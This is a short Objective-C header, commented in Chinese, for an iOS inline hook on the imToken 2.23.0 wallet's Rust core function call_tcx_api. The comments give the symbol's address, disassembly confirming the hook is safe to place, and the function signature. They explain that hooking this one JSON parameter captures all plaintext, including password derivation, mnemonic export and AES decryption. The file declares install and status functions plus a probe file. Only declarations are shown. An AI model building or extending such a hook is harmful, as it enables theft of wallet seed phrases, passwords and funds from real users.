//
//  HookTcx.h — 截 Rust 钱包核心的唯一 FFI 入口 call_tcx_api
//
//  静态分析结论（imToken-2.23.0，Payload/token.app/token）：
//    · 导出符号只有 _call_tcx_api 一个入口（vaddr 0x100f02068）
//    · 前 16 字节是纯栈操作，没有 PC 相对指令 → 可安全 inline hook
//    · 反汇编 +00..+32：
//          sub sp, sp, #0x170
//          stp x28, x27, [sp, #272]
//          stp x26, x25, [sp, #288]
//          stp x24, x23, [sp, #304]
//          ...
//          mov x19, x0            ← x0 = 参数（JSON 字符串）
//      → 签名等价于 char *call_tcx_api(const char *param)
//
//  因为密码派生（CryptoSwift/Rust pbkdf2）、助记词导出、AES 解密全在 Rust 里，
//  CommonCrypto 一个都不走；只有这个 JSON 参数能一次拿到全部明文。
//
#import <Foundation/Foundation.h>

/// 安装 hook（dlsym 找不到符号时自动退回「主映像基址 + 静态偏移」）
void HookTcxInstall(void);

/// 是否安装成功
BOOL HookTcxInstalled(void);

/// 安装状态描述（写进探针文件）
NSString *HookTcxStatus(void);
